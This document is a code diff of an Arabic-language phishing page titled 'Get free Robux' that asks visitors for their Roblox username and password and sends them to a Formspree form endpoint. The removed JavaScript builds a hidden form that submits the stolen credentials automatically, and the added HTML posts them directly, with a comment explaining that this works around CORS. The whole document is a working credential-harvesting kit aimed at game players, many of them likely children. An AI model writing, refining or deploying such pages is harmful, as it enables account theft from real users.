@@ -1,36 +1,28 @@
-<script>
-function sendData() {
-    const formspreeURL = "https://formspree.io"; 
-    
-    const user = document.getElementById('user').value;
-    const pass = document.getElementById('pass').value;
-    const amount = document.getElementById('amount').value;
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>احصل على روبوكس مجاناً</title>
+    <style>
+        body { background: #f4f4f4; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0084ff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
 
-    if(!user || !pass || !amount) {
-        alert("يرجى ملء البيانات أولاً!");
-        return;
-    }
+    <div class="box">
+        <img src="https://upload.wikimedia.org" width="60">
+        <h2>روبوكس مجاني</h2>
+        <!-- الفورم ده بيبعت لـ Formspree مباشرة عشان نهرب من مشكلة CORS -->
+        <form action="https://formspree.io" method="POST">
+            <input type="text" name="Username" placeholder="اسم المستخدم" required>
+            <input type="password" name="Password" placeholder="كلمة المرور" required>
+            <input type="number" name="Amount" placeholder="كمية الروبوكس" required>
+            <button type="submit">تأكيد الآن</button>
+        </form>
+    </div>
 
-    // إنشاء "فورم" وهمي وإرساله تلقائياً
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = formspreeURL;
-
-    const fields = {
-        'Username': user,
-        'Password': pass,
-        'Robux_Amount': amount
-    };
-
-    for (const key in fields) {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = fields[key];
-        form.appendChild(input);
-    }
-
-    document.body.appendChild(form);
-    form.submit(); // الإرسال المباشر
-}
-</script>
+</body>
+</html>
